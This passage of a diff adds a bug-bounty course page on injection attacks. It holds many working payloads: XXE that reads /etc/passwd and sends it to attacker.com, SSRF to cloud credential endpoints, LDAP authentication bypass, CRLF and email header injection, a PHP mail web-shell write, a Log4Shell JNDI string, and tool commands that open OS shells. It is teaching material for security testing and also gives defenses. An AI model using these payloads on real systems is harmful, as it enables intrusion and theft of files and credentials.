+<span class="kw">&lt;!ENTITY</span> % file <span class="kw">SYSTEM</span> <span class="str">"file:///etc/hostname"</span><span class="kw">&gt;</span>
+<span class="kw">&lt;!ENTITY</span> % eval <span class="str">"&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'&gt;"</span><span class="kw">&gt;</span>
+<span class="kw">%eval;</span>
+<span class="kw">%exfil;</span>
+
+<span class="comment">&lt;!-- The parser loads evil.dtd, reads /etc/hostname into %file,</span>
+<span class="comment">     constructs a URL containing the file data, and requests it --&gt;</span>
+
+<span class="comment">&lt;!-- Error-based OOB (when outbound HTTP is blocked but errors are verbose) --&gt;</span>
+<span class="kw">&lt;!ENTITY</span> % file <span class="kw">SYSTEM</span> <span class="str">"file:///etc/passwd"</span><span class="kw">&gt;</span>
+<span class="kw">&lt;!ENTITY</span> % eval <span class="str">"&lt;!ENTITY &amp;#x25; error SYSTEM 'file:///nonexistent/%file;'&gt;"</span><span class="kw">&gt;</span>
+<span class="kw">%eval;</span>
+<span class="kw">%error;</span>
+<span class="comment">&lt;!-- Parser error includes file contents in the "file not found" message --&gt;</span></div>
+
+            <h3>XXE Through File Upload</h3>
+            <p>
+                XML is embedded in many file formats. Applications that process uploads of SVG
+                images, DOCX/XLSX/PPTX documents, or any XML-based format may be vulnerable to
+                XXE even when they do not expose an obvious XML API endpoint.
+            </p>
+
+            <div class="code-block"><span class="comment">&lt;!-- SVG file with XXE (upload as profile picture, etc.) --&gt;</span>
+<span class="kw">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+<span class="kw">&lt;!DOCTYPE svg [</span>
+  <span class="kw">&lt;!ENTITY</span> xxe <span class="kw">SYSTEM</span> <span class="str">"file:///etc/hostname"</span><span class="kw">&gt;</span>
+<span class="kw">]&gt;</span>
+&lt;svg xmlns=<span class="str">"http://www.w3.org/2000/svg"</span> width=<span class="str">"200"</span> height=<span class="str">"200"</span>&gt;
+  &lt;text x=<span class="str">"10"</span> y=<span class="str">"50"</span> font-size=<span class="str">"16"</span>&gt;<span class="str">&amp;xxe;</span>&lt;/text&gt;
+&lt;/svg&gt;
+
+<span class="comment">&lt;!-- DOCX XXE: unzip the .docx, modify word/document.xml, rezip --&gt;</span>
+<span class="cmd">unzip</span> document.docx -d docx_contents
+<span class="comment"># Edit docx_contents/word/document.xml to include DOCTYPE with ENTITY</span>
+<span class="comment"># Rezip:</span>
+<span class="cmd">cd</span> docx_contents && <span class="cmd">zip</span> -r ../malicious.docx .
+
+<span class="comment">&lt;!-- XLSX XXE: same approach with xl/sharedStrings.xml or xl/workbook.xml --&gt;</span>
+<span class="cmd">unzip</span> spreadsheet.xlsx -d xlsx_contents
+<span class="comment"># Edit xlsx_contents/xl/workbook.xml with XXE payload</span>
+<span class="cmd">cd</span> xlsx_contents && <span class="cmd">zip</span> -r ../malicious.xlsx .</div>
+
+            <h3>XXE to SSRF</h3>
+            <p>
+                External entities can reference internal network resources, turning XXE into SSRF.
+                This allows scanning internal ports, accessing cloud metadata endpoints, and
+                reaching services that are not exposed to the internet.
+            </p>
+
+            <div class="code-block"><span class="comment">&lt;!-- Access AWS metadata endpoint --&gt;</span>
+<span class="kw">&lt;!DOCTYPE foo [</span>
+  <span class="kw">&lt;!ENTITY</span> xxe <span class="kw">SYSTEM</span> <span class="str">"http://169.254.169.254/latest/meta-data/iam/security-credentials/"</span><span class="kw">&gt;</span>
+<span class="kw">]&gt;</span>
+&lt;root&gt;&lt;data&gt;<span class="str">&amp;xxe;</span>&lt;/data&gt;&lt;/root&gt;
+
+<span class="comment">&lt;!-- Scan internal ports --&gt;</span>
+<span class="kw">&lt;!DOCTYPE foo [</span>
+  <span class="kw">&lt;!ENTITY</span> xxe <span class="kw">SYSTEM</span> <span class="str">"http://192.168.1.1:8080/"</span><span class="kw">&gt;</span>
+<span class="kw">]&gt;</span>
+&lt;root&gt;&lt;data&gt;<span class="str">&amp;xxe;</span>&lt;/data&gt;&lt;/root&gt;
+
+<span class="comment">&lt;!-- Access internal API --&gt;</span>
+<span class="kw">&lt;!DOCTYPE foo [</span>
+  <span class="kw">&lt;!ENTITY</span> xxe <span class="kw">SYSTEM</span> <span class="str">"http://internal-api.corp:3000/admin/users"</span><span class="kw">&gt;</span>
+<span class="kw">]&gt;</span>
+&lt;root&gt;&lt;data&gt;<span class="str">&amp;xxe;</span>&lt;/data&gt;&lt;/root&gt;</div>
+
+            <h3>XXE Detection in Different Content Types</h3>
+
+            <div class="code-block"><span class="comment"># Test XML content type on non-XML endpoints</span>
+<span class="comment"># Change Content-Type and send XML body</span>
+<span class="cmd">POST</span> /api/user
+Content-Type: <span class="str">application/xml</span>
+
+<span class="kw">&lt;?xml version="1.0"?&gt;</span>
+<span class="kw">&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;</span>
+&lt;user&gt;&lt;name&gt;<span class="str">&amp;xxe;</span>&lt;/name&gt;&lt;/user&gt;
+
+<span class="comment"># Test with text/xml content type</span>
+Content-Type: <span class="str">text/xml</span>
+
+<span class="comment"># Test SOAP endpoints</span>
+Content-Type: <span class="str">text/xml; charset=utf-8</span>
+SOAPAction: <span class="str">"GetUser"</span>
+
+<span class="comment"># Test with XInclude (when you cannot control the full XML document)</span>
+&lt;foo xmlns:xi=<span class="str">"http://www.w3.org/2001/XInclude"</span>&gt;
+  &lt;xi:include parse=<span class="str">"text"</span> href=<span class="str">"file:///etc/passwd"</span>/&gt;
+&lt;/foo&gt;</div>
+
+            <div class="callout callout-tip">
+                <span class="callout-icon">&#10003;</span>
+                <div>
+                    <div class="callout-title">Parameter Entity Restrictions</div>
+                    <div class="callout-text">
+                        Many modern XML parsers disable general external entities but still process
+                        parameter entities (the <code>%</code> syntax used within DTDs). If a basic
+                        <code>&amp;xxe;</code> entity does not work, try parameter entities with an
+                        external DTD. Also try XInclude, which uses a different mechanism than DTD entities
+                        and may be processed even when external entities are disabled.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- Section 07: LDAP & Header Injection                          -->
+    <!-- ============================================================ -->
+    <div class="section" id="s7">
+        <div class="section-number">Section 07</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#128209;</span>
+            LDAP &amp; Header Injection
+        </h2>
+        <div class="section-body">
+            <p>
+                Beyond SQL and template engines, injection vulnerabilities exist in every protocol
+                and data format where user input is concatenated into structured queries or messages.
+                LDAP directories, HTTP headers, email headers, and application logs are all attack
+                surfaces when input is not properly sanitized before incorporation.
+            </p>
+
+            <h3>LDAP Injection</h3>
+            <p>
+                LDAP (Lightweight Directory Access Protocol) is used by organizations for
+                authentication, user lookup, and directory services. When applications construct
+                LDAP search filters using unsanitized user input, the filter logic can be
+                manipulated to bypass authentication or extract directory information.
+            </p>
+
+            <div class="code-block"><span class="comment"># Normal LDAP search filter</span>
+(&amp;(uid=<span class="str">john</span>)(userPassword=<span class="str">secret</span>))
+
+<span class="comment"># Authentication bypass: inject always-true condition</span>
+<span class="comment"># Username input: *</span>
+<span class="comment"># Password input: *</span>
+(&amp;(uid=<span class="str">*</span>)(userPassword=<span class="str">*</span>))
+<span class="comment"># Matches any user with any password &mdash; returns first entry</span>
+
+<span class="comment"># Authentication bypass: close filter early</span>
+<span class="comment"># Username input: admin)(&amp;)</span>
+(&amp;(uid=<span class="str">admin)(&amp;)</span>)(userPassword=anything))
+<span class="comment"># The (&amp;) is always true, password check becomes part of a dead filter</span>
+
+<span class="comment"># Wildcard enumeration</span>
+<span class="comment"># Username input: a*</span>
+(&amp;(uid=<span class="str">a*</span>)(objectClass=person))
+<span class="comment"># Returns all users starting with 'a' &mdash; iterate through the alphabet</span>
+
+<span class="comment"># Attribute extraction via OR injection</span>
+<span class="comment"># Input: *)(mail=*</span>
+(&amp;(uid=<span class="str">*)(mail=*</span>)(objectClass=person))
+<span class="comment"># Enumerates email addresses by checking which exist</span>
+
+<span class="comment"># Null byte to truncate (older LDAP implementations)</span>
+<span class="comment"># Username input: admin)%00</span>
+(&amp;(uid=<span class="str">admin)%00</span>)(userPassword=anything))
+<span class="comment"># Everything after %00 is ignored</span></div>
+
+            <h3>HTTP Header Injection (CRLF Injection)</h3>
+            <p>
+                HTTP headers are separated by CRLF sequences (<code>\r\n</code> or
+                <code>%0d%0a</code>). When user input is reflected in a response header without
+                stripping these characters, an attacker can inject arbitrary headers or even
+                inject a response body, enabling response splitting, cache poisoning, or XSS.
+            </p>
+
+            <div class="code-block"><span class="comment"># Vulnerable redirect: Location header includes user input</span>
+<span class="cmd">GET</span> /redirect?url=<span class="str">http://example.com%0d%0aX-Injected-Header:%20true</span>
+
+<span class="comment"># Response becomes:</span>
+HTTP/1.1 302 Found
+Location: http://example.com
+<span class="str">X-Injected-Header: true</span>
+
+<span class="comment"># Inject Set-Cookie header (session fixation)</span>
+<span class="cmd">GET</span> /redirect?url=<span class="str">http://example.com%0d%0aSet-Cookie:%20session=attacker_controlled</span>
+
+<span class="comment"># Full response splitting: inject body after double CRLF</span>
+<span class="cmd">GET</span> /redirect?url=<span class="str">http://example.com%0d%0a%0d%0a&lt;html&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;/html&gt;</span>
+
+<span class="comment"># Cache poisoning via header injection</span>
+<span class="comment"># If a cache server stores the split response, all subsequent users receive the injected content</span>
+
+<span class="comment"># Test vectors for CRLF</span>
+<span class="str">%0d%0a</span>      <span class="comment"># URL-encoded CRLF</span>
+<span class="str">%0a</span>          <span class="comment"># Just LF (works on many servers)</span>
+<span class="str">%E5%98%8A</span>   <span class="comment"># Unicode CRLF equivalent (UTF-8 encoded)</span>
+<span class="str">\r\n</span>         <span class="comment"># Literal (if input is processed by an interpreter)</span></div>
+
+            <h3>Email Header Injection</h3>
+            <p>
+                When an application sends email using user-supplied values in header fields
+                (To, CC, BCC, Subject), injecting newlines allows adding arbitrary recipients
+                or headers, turning a contact form into an open spam relay.
+            </p>
+
+            <div class="code-block"><span class="comment"># Normal contact form sends email to support@company.com</span>
+<span class="comment"># Inject CC header via the "From" or "Subject" field</span>
+
+<span class="comment"># Subject field injection</span>
+Subject: <span class="str">Hello%0aCc: victim@target.com%0aBcc: attacker@evil.com</span>
+
+<span class="comment"># From field injection</span>
+From: <span class="str">user@test.com%0aCc: victim1@target.com%0aCc: victim2@target.com</span>
+
+<span class="comment"># Inject email body (add blank line then content)</span>
+Subject: <span class="str">Hello%0a%0aInjected email body content here</span>
+
+<span class="comment"># PHP mail() specific: additional headers via 5th parameter</span>
+<span class="comment"># If the application passes user input as the $additional_headers parameter:</span>
+<span class="str">-X/var/www/html/shell.php</span>
+<span class="comment"># Writes the email log to a PHP file accessible via web</span></div>
+
+            <h3>Log Injection</h3>
+            <p>
+                When user input appears in application logs without sanitization, an attacker can
+                inject newlines to forge log entries, inject ANSI escape sequences to exploit
+                terminal-based log viewers, or in the case of logging frameworks with expression
+                evaluation, achieve remote code execution.
+            </p>
+
+            <div class="code-block"><span class="comment"># Forge a log entry (inject newline + fake log line)</span>
+<span class="comment"># Input in username field:</span>
+<span class="str">admin%0a[2026-02-28 12:00:00] INFO: User admin logged in successfully from 10.0.0.1</span>
+
+<span class="comment"># Application log shows:</span>
+[2026-02-28 12:00:01] WARN: Failed login for user admin
+[2026-02-28 12:00:00] INFO: User admin logged in successfully from 10.0.0.1
+
+<span class="comment"># ANSI escape injection (terminal viewers)</span>
+<span class="str">admin\x1b[2J\x1b[1;1H</span>   <span class="comment"># Clears terminal screen</span></div>
+
+            <div class="callout callout-danger">
+                <span class="callout-icon">&#9888;</span>
+                <div>
+                    <div class="callout-title">Log4Shell Reference (CVE-2021-44228)</div>
+                    <div class="callout-text">
+                        The Log4Shell vulnerability demonstrated the catastrophic impact of injection
+                        through logging. Log4j 2.x evaluated JNDI lookup expressions in log messages:
+                        <code>${jndi:ldap://attacker.com/a}</code>. When a server logged user-controlled
+                        input (User-Agent, URL parameters, form fields) through Log4j, the expression
+                        triggered an outbound LDAP/RMI connection that loaded and executed arbitrary
+                        Java classes. This turned every logged input field into an RCE vector. Always
+                        check for JNDI expression evaluation: <code>${jndi:dns://collaborator.com}</code>
+                        in any header or parameter that might be logged.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- Section 08: Injection Defense & Testing Strategy              -->
+    <!-- ============================================================ -->
+    <div class="section" id="s8">
+        <div class="section-number">Section 08</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#128737;</span>
+            Injection Defense &amp; Testing Strategy
+        </h2>
+        <div class="section-body">
+            <p>
+                Understanding defenses is essential for two reasons: it tells you what to look for
+                when testing (gaps in the defense), and it strengthens the remediation section of
+                your reports. A finding with clear, actionable remediation advice is triaged faster
+                and earns more respect from the program's engineering team.
+            </p>
+
+            <h3>Parameterized Queries</h3>
+            <p>
+                Parameterized queries (prepared statements) are the definitive defense against SQL
+                injection. They separate the query structure from the data, ensuring that user input
+                is always treated as a literal value and never as SQL syntax. Every major language
+                and framework provides this capability.
+            </p>
+
+            <div class="code-block"><span class="comment"># VULNERABLE: string concatenation</span>
+<span class="kw">cursor.execute</span>(<span class="str">"SELECT * FROM users WHERE id = "</span> + user_id)
+
+<span class="comment"># SAFE: parameterized query (Python / psycopg2)</span>
+<span class="kw">cursor.execute</span>(<span class="str">"SELECT * FROM users WHERE id = %s"</span>, (user_id,))
+
+<span class="comment"># SAFE: parameterized query (Java / PreparedStatement)</span>
+PreparedStatement stmt = conn.<span class="kw">prepareStatement</span>(<span class="str">"SELECT * FROM users WHERE id = ?"</span>);
+stmt.<span class="kw">setInt</span>(1, userId);
+
+<span class="comment"># SAFE: parameterized query (Node.js / mysql2)</span>
+connection.<span class="kw">execute</span>(<span class="str">"SELECT * FROM users WHERE id = ?"</span>, [userId]);
+
+<span class="comment"># SAFE: ORM (Python / SQLAlchemy)</span>
+User.query.<span class="kw">filter_by</span>(id=user_id).<span class="kw">first</span>()
+
+<span class="comment"># STILL VULNERABLE: ORM with raw query</span>
+User.query.<span class="kw">filter</span>(<span class="str">"id = "</span> + user_id)  <span class="comment"># Never do this</span></div>
+
+            <h3>Input Validation vs Output Encoding</h3>
+
+            <div class="two-col">
+                <div class="col-card">
+                    <h3>&#9658; Input Validation</h3>
+                    <ul>
+                        <li><span class="li-marker">&#8227;</span> Validate type, length, range, and format at entry point</li>
+                        <li><span class="li-marker">&#8227;</span> Use allowlists over denylists: define what IS allowed, not what is blocked</li>
+                        <li><span class="li-marker">&#8227;</span> Reject unexpected characters for structured fields (IDs, emails, dates)</li>
+                        <li><span class="li-marker">&#8227;</span> Cast to expected type before use (parseInt, type hints)</li>
+                        <li><span class="li-marker">&#8227;</span> Does NOT prevent injection alone &mdash; defense in depth layer</li>
+                    </ul>
+                </div>
+                <div class="col-card">
+                    <h3>&#9658; Output Encoding</h3>
+                    <ul>
+                        <li><span class="li-marker">&#8227;</span> Encode data at the point of output, matching the output context</li>
+                        <li><span class="li-marker">&#8227;</span> HTML context: encode &lt; &gt; &amp; " '</li>
+                        <li><span class="li-marker">&#8227;</span> JavaScript context: hex-encode non-alphanumeric characters</li>
+                        <li><span class="li-marker">&#8227;</span> URL context: percent-encode special characters</li>
+                        <li><span class="li-marker">&#8227;</span> CSS context: hex-encode for property values</li>
+                    </ul>
+                </div>
+            </div>
+
+            <h3>WAF vs Application-Level Defense</h3>
+
+            <table class="standards-table">
+                <thead>
+                    <tr>
+                        <th>Aspect</th>
+                        <th>WAF (Network Layer)</th>
+                        <th>Application Layer</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td class="std-name">Approach</td>
+                        <td>Pattern matching on HTTP traffic (regex, signatures)</td>
+                        <td>Parameterized queries, type-safe APIs, encoding functions</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">Bypass Risk</td>
+                        <td><span class="badge badge-high">High</span> &mdash; encoding, case variation, protocol tricks</td>
+                        <td><span class="badge badge-current">Low</span> &mdash; correct implementation eliminates the vulnerability class</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">Maintenance</td>
+                        <td>Rules must be updated as new bypass techniques emerge</td>
+                        <td>Secure by default once the framework enforces the pattern</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">False Positives</td>
+                        <td>High &mdash; legitimate input may match attack signatures</td>
+                        <td>None &mdash; parameterized queries handle all input correctly</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">Role</td>
+                        <td>Virtual patching, defense in depth, logging/alerting</td>
+                        <td>Root cause fix, eliminates vulnerability at the source</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <div class="callout callout-info">
+                <span class="callout-icon">&#8505;</span>
+                <div>
+                    <div class="callout-title">WAFs Are Speed Bumps, Not Walls</div>
+                    <div class="callout-text">
+                        In your bug reports, note when a WAF is present but can be bypassed. Programs
+                        value this information because it demonstrates that their WAF provides a false
+                        sense of security. Recommend application-level fixes as the primary remediation
+                        and WAF rules as a temporary mitigation while the code fix is deployed.
+                    </div>
+                </div>
+            </div>
+
+            <h3>Systematic Testing Methodology</h3>
+            <p>
+                A structured approach to injection testing ensures coverage and prevents wasted
+                effort. Work through each injection class systematically for every input vector.
+            </p>
+
+            <ul class="numbered-list">
+                <li>
+                    <strong>Map all input vectors.</strong> Identify every parameter, header, cookie,
+                    file upload, and WebSocket message that reaches the server. Use Burp Suite's
+                    site map and parameter analysis to build a comprehensive list.
+                </li>
+                <li>
+                    <strong>Classify each input by context.</strong> Determine where the input is
+                    used: SQL query, template render, OS command, XML parser, LDAP filter, HTTP
+                    header, or log output. The context dictates which payloads to test.
+                </li>
+                <li>
+                    <strong>Test with detection probes first.</strong> Send the simplest possible
+                    probe for each injection class and observe the response. Single quote for SQLi,
+                    <code>{{7*7}}</code> for SSTI, <code>%0d%0a</code> for CRLF, and so on.
+                </li>
+                <li>
+                    <strong>Confirm with a second, different probe.</strong> A single anomalous
+                    response could be a coincidence. Confirm injection with a different payload
+                    that produces a predictable, different result. Boolean pairs, mathematical
+                    expressions, or time delays provide reliable confirmation.
+                </li>
+                <li>
+                    <strong>Escalate to demonstrate impact.</strong> Extract data, read files, or
+                    achieve code execution to prove the severity. The difference between an
+                    informational finding and a critical finding is often just the exploitation
+                    depth documented in the report.
+                </li>
+                <li>
+                    <strong>Document the full chain.</strong> Record every request and response in
+                    your report. Include the raw HTTP requests, not just parameter values. Show the
+                    progression from detection to data extraction. Screenshots of extracted data
+                    prove impact unambiguously.
+                </li>
+                <li>
+                    <strong>Test WAF/filter bypasses last.</strong> If initial probes are blocked,
+                    identify the filter pattern and test the bypass techniques covered in this
+                    module. Document what the WAF blocks and what passes through.
+                </li>
+            </ul>
+
+            <h3>Essential Testing Tools</h3>
+
+            <div class="tool-grid">
+                <div class="tool-card">
+                    <div class="tool-name">sqlmap</div>
+                    <div class="tool-role">SQL Injection</div>
+                    <div class="tool-desc">
+                        Automated SQL injection detection and exploitation. Supports all major DBMS,
+                        multiple injection techniques (boolean, time, UNION, error, stacked, OOB),
+                        tamper scripts for WAF bypass, and direct database shell access.
+                    </div>
+                </div>
+                <div class="tool-card">
+                    <div class="tool-name">XSStrike</div>
+                    <div class="tool-role">XSS Detection</div>
+                    <div class="tool-desc">
+                        Advanced XSS scanner with context-aware payload generation. Analyzes the
+                        reflection context (HTML, attribute, JavaScript, URL) and generates payloads
+                        specifically designed to escape that context. Includes fuzzing and WAF
+                        detection capabilities.
+                    </div>
+                </div>
+                <div class="tool-card">
+                    <div class="tool-name">Dalfox</div>
+                    <div class="tool-role">XSS Scanning</div>
+                    <div class="tool-desc">
+                        Fast parameter analysis and XSS scanning tool written in Go. Supports
+                        pipe-based input from other tools, DOM-based XSS detection, blind XSS
+                        callbacks, and integration with Burp Collaborator for out-of-band verification.
+                    </div>
+                </div>
+                <div class="tool-card">
+                    <div class="tool-name">tplmap</div>
+                    <div class="tool-role">SSTI Exploitation</div>
+                    <div class="tool-desc">
+                        Automated Server-Side Template Injection detection and exploitation. Supports
+                        Jinja2, Twig, Freemarker, Velocity, Smarty, Mako, and more. Provides OS
+                        command execution, file read/write, and reverse shell capabilities through
+                        template injection.
+                    </div>
+                </div>
+                <div class="tool-card">
+                    <div class="tool-name">Commix</div>
+                    <div class="tool-role">Command Injection</div>
+                    <div class="tool-desc">
+                        Automated command injection and exploitation tool. Tests for results-based,
+                        time-based blind, and file-based injection. Supports multiple OS targets
+                        and provides an interactive pseudo-terminal for post-exploitation.
+                    </div>
+                </div>
+                <div class="tool-card">
+                    <div class="tool-name">XXEinjector</div>
+                    <div class="tool-role">XXE Exploitation</div>
+                    <div class="tool-desc">
+                        Automated XXE injection tool that handles direct, OOB, and error-based
+                        exfiltration. Starts its own HTTP and FTP servers for data capture.
+                        Supports file enumeration, directory listing, and SSRF through XXE.
+                    </div>
+                </div>
+            </div>
+
+            <div class="code-block"><span class="comment"># sqlmap: detect and exploit with WAF bypass</span>
+<span class="cmd">sqlmap</span> <span class="flag">-r</span> request.txt <span class="flag">--batch</span> <span class="flag">--tamper</span>=space2comment,between <span class="flag">--level</span>=5 <span class="flag">--risk</span>=3
+
+<span class="comment"># XSStrike: scan with custom headers</span>
+<span class="cmd">python3</span> xsstrike.py <span class="flag">-u</span> <span class="str">"http://target.com/search?q=test"</span> <span class="flag">--headers</span> <span class="str">"Cookie: session=abc123"</span>
+
+<span class="comment"># Dalfox: pipe URLs from gau/waybackurls</span>
+<span class="cmd">cat</span> urls.txt | <span class="cmd">dalfox</span> <span class="flag">pipe</span> <span class="flag">-b</span> <span class="str">"https://your-bxss-server.com"</span>
+
+<span class="comment"># tplmap: detect and get OS shell</span>
+<span class="cmd">tplmap</span> <span class="flag">-u</span> <span class="str">"http://target.com/page?name=test"</span> <span class="flag">--os-shell</span>
+
+<span class="comment"># Commix: test POST parameter</span>
+<span class="cmd">commix</span> <span class="flag">-u</span> <span class="str">"http://target.com/ping"</span> <span class="flag">--data</span>=<span class="str">"ip=127.0.0.1"</span> <span class="flag">-p</span> ip
+
+<span class="comment"># Nuclei: run injection-specific templates</span>
+<span class="cmd">nuclei</span> <span class="flag">-u</span> <span class="str">"http://target.com"</span> <span class="flag">-t</span> vulnerabilities/sqli/ <span class="flag">-t</span> vulnerabilities/xss/ <span class="flag">-t</span> vulnerabilities/ssti/</div>
+        </div>
+    </div>
+
+    <!-- Discussion Prompts -->
+    <div class="section" id="discuss">
+        <div class="discussion-section">
+            <div class="discussion-title">
+                <span>&#128172;</span>
+                Discussion Prompts
+            </div>
+            <ul class="prompt-list">
+                <li class="prompt-item">
+                    <span class="prompt-num">01</span>
+                    Consider a target that uses a WAF blocking common SQLi patterns. You have confirmed that a parameter is injectable using time-based blind techniques that the WAF does not catch. How do you decide between spending hours on manual blind extraction versus moving on and reporting the confirmed vulnerability with limited data as proof of impact?
+                </li>
+                <li class="prompt-item">
+                    <span class="prompt-num">02</span>
+                    SSTI typically leads directly to RCE, making it a critical finding. However, many programs restrict testing to "proof of concept only" and prohibit actual command execution on production systems. How would you demonstrate SSTI impact convincingly without executing OS commands? What non-destructive proof points carry the most weight with triage teams?
+                </li>
+                <li class="prompt-item">
+                    <span class="prompt-num">03</span>
+                    XXE through file uploads (SVG, DOCX) is often overlooked because the upload endpoint appears to handle images or documents, not raw XML. What systematic approach would you use to identify all file upload endpoints that might process XML internally, and how would you prioritize which ones to test first?
+                </li>
+            </ul>
+        </div>
+    </div>
+
+    <!-- Completion -->
+    <div class="section" id="completion">
+        <div class="completion-section">
+            <div class="completion-icon">&#10003;</div>
+            <h2 class="completion-title">Module Complete</h2>
+            <p class="completion-text">
+                You have covered SQL injection exploitation chains including error-based, UNION-based,
+                blind boolean, time-based, second-order, and out-of-band techniques. You studied NoSQL
+                operator injection and authentication bypass, XSS filter bypass and WAF evasion including
+                encoding tricks, CSP bypasses, DOM clobbering, and mutation XSS. You explored SSTI
+                detection and RCE chains across Jinja2, Twig, Freemarker, Velocity, and Thymeleaf.
+                You examined OS command injection with filter bypasses, XXE file read and OOB exfiltration
+                through multiple file formats, LDAP and header injection, and the systematic testing
+                methodology that ties it all together.
+            </p>
+            <button class="completion-btn" onclick="completeModule()">
+                <span>&#10003;</span>
+                Complete Module 06
+            </button>
+        </div>
+    </div>
+
+</main>
+
+<script>
+    function updateScrollProgress() {
+        const scrollTop = window.scrollY;
+        const docHeight = document.documentElement.scrollHeight - window.innerHeight;
+        const pct = docHeight > 0 ? (scrollTop / docHeight) * 100 : 0;
+        document.getElementById('scrollProgress').style.width = pct + '%';
+        document.getElementById('readingFill').style.width = pct + '%';
+    }
+
+    window.addEventListener('scroll', updateScrollProgress, { passive: true });
+
+    function initSectionAnimations() {
+        const observer = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) entry.target.classList.add('visible');
+            });
+        }, { threshold: 0.08 });
+
+        document.querySelectorAll('.section').forEach(s => observer.observe(s));
+    }
+
+    function toggleDetail(header) {
+        const body = header.nextElementSibling;
+        const toggle = header.querySelector('.detail-toggle');
+        const isOpen = body.classList.contains('open');
+        body.classList.toggle('open', !isOpen);
+        toggle.classList.toggle('open', !isOpen);
+    }
+
+    function completeModule() {
+        if (typeof ModuleProgress !== 'undefined') {
+            ModuleProgress.complete('dark-arts', 'bh-mod-injection', {
+                returnUrl: '../index.html'
+            });
+        }
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+        initSectionAnimations();
+    });
+</script>
+
+</body>
+</html>
